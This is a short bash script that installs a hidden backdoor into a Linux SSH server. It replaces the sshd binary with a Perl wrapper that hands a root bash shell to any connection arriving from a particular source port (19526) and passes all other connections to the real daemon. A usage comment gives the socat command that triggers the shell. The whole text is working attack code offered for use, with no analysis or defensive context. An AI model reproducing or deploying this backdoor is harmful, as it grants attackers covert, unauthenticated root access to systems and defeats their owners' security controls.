#!/bin/bash

#sshd
#-------------------------
mv /usr/sbin/sshd /usr/bin/
touch /usr/sbin/sshd

cat <<EOF >> /usr/sbin/sshd
#!/usr/bin/perl
exec"/bin/bash"if(getpeername(STDIN)=~/^..LF/);
exec{"/usr/bin/sshd"}"/usr/sbin/sshd",@ARGV;
EOF

chmod +x /usr/sbin/sshd
service sshd restart

#usage
#socat STDIO TCP4:<target ip>:22,sourceport=19526
